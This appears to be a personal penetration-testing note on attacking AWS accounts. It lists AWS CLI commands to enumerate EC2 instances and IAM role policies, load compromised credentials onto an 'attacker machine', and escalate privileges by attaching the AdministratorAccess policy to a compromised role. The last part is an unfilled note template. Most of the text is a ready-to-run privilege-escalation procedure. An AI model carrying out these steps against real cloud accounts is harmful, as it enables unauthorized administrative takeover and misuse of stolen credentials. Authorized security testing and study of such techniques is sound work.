

#### 🚀 - Enumeration and a particular attack: Role assignment
---
-List instances in an organization account:
`aws ec2 describe-instances --profile [profile name]`
OR
`aws ec2 describe-instances --profile [profile name] --zone [specify the zone]` 

Check for what are the services attached, any public IPs. Check for any web vulnerabilities or exposed ports that could be compromised to obtain information about the instance.

Check [[AWS Exploitation of SSRF or RCE]] to get further information about a vulnerable instance.

-Any new compromised credentials re-configure them in your local attacker machine with the `aws configure` commands:

```
aws configure set aws_access_key_id [key-id] --profile ec2
aws configure set aws_secret_access_key [key-id] --profile ec2
aws configure set aws_session_token [token] --profile ec2
```

Re-enumerate any new users identified and configured.

-List attached managed policies to an instance's role:
`aws iam list-attached-role-policies --role-name [role name] --profile [profile name]`

-List attached inline policies to an instance's role:
`aws iam list-role-policies --role-name jump-ec2-role --profile [profile name]`

-List permissions of a policy attached to an instance's role:
`aws iam get-role-policy --role-name [role name] --policy-name [policy name] --profile [profile name]`

Make sure you read and understand the permissions in the policies. Some will allow you to attach other policies to your role, or user, or group, these sort of permissions allow privilege escalation much easier.

-Attach a policy to a role:
`aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name [current role you are at] --profile [profile name]`

In this attack, we checked the role policy permissions and it allowed to assign any other policies to the role. You can try adding then an Admin policy and attempt further exploitaiton.

---
#### 📦 - B
--- 

#### 🖊️ - C


⚠ Alert 1
⚠ Alert 2
⚠ Alert 3


--- 

 1️⃣ A
 2️⃣ B
 
--- 

❗C


### Properties
---
📆 created   {{15-12-2024}} 15:15
🏷️ tags: #cloud #aws 

---
